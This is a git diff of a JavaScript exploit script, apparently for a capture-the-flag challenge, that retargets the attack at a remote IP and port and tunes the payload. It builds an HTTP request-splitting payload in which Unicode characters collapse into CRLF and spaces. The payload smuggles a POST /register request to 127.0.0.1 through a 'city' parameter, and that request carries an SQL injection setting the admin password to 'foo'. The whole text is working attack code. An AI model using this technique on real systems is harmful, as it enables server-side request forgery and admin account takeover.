@@ -1,4 +1,5 @@
-const host = 'http://localhost:1337'
+//const host = 'http://localhost:1337'
+const host = 'http://206.189.24.162:32104'
 //const injection = "bar'); update users set password='foo' where username='admin' --";
 const injection = "'),('admin', 'foo') on conflict(username) do update set password='foo'--";
 const crlf = '\u{010D}\u{010A}'
@@ -6,18 +7,23 @@ const space = '\u{0120}'
 const query = `username=foo&password=${encodeURIComponent(injection)}`;
 let payload = [
   `x${space}HTTP/1.1`,
-  `Host:${space}127.0.0.1:80${crlf}`,
+  `Host:${space}127.0.0.1:80`,
+  `Content-Length:${space}0`,
+  '',
   `POST${space}/register${space}HTTP/1.1`,
   `Host:${space}127.0.0.1:80`,
   'Content-Type:'+space+'application/x-www-form-urlencoded',
-  `Content-Length:${space}${query.length+24}`,
+  `Content-Length:${space}${query.length+14}`,
   '',
-  query
+  query,
+  '',
+  `GET${space}/placeholder`
 ];
 payload = payload.join(crlf);
 console.log(payload);
 console.log(encodeURIComponent(payload))
 console.log(Buffer.from(payload, 'latin1').toString('latin1'))
+console.log(Buffer.from(payload))
 const params = {
   endpoint: encodeURIComponent('127.0.0.1:80'),
   city: encodeURIComponent(payload),
